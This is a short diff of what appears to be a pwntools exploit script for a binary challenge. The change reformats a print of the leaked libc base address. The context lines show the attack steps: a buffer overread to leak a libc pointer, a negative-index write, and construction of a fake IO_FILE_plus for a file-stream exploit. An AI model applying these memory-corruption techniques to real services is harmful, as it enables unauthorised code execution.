@@ -21,7 +21,7 @@ if __name__=='__main__':
 	io.sendafter('name: ','A'*0x50)
 	libc_leak = u64(io.recvline()[0x50:].strip().ljust(8,b'\x00'))
 	libc_base = libc_leak - leak_offset
-	print(f'Libc: {libc_base:#x}')
+	print(f'Libc: {libc_base:x}')
 
 	io.sendlineafter('to write: ','-6')
 	IO_file = IO_FILE_plus(arch=64)
